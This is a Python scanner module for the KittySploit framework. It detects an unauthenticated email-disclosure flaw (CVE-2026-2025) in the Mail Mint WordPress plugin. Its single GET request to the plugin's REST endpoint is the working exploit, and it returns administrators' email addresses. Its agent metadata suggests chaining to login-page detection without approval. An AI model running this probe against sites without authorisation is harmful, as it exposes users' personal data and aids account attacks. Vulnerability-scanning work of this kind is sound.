#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Mail Mint WordPress plugin < 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mail Mint < 1.19.5 - Unauthenticated Email Disclosure Detection',
        'description': 'Mail Mint WordPress plugin < 1.19.5 contains an information disclosure vulnerability caused by lack of authorization in a REST API endpoint, letting unauthenticated users retrieve email addresses of blog users, exploit requires no authentication.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'wordpress', 'wp-plugin', 'mail-mint', 'exposure', 'unauth', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/1b815cde-cd9d-46fa-a6ab-3d2851705e7b/',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-2025',
            'https://wordpress.org/plugins/mail-mint/',
        ],
        'cve': 'CVE-2026-2025',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-json/mrm/v1/wp/admins?term=@', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('application/json',)
        body_all = ('@',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Mail Mint < 1.19.5 - Unauthenticated Email Disclosure detected",
                path='/wp-json/mrm/v1/wp/admins?term=@',
            )
            return True
        return False

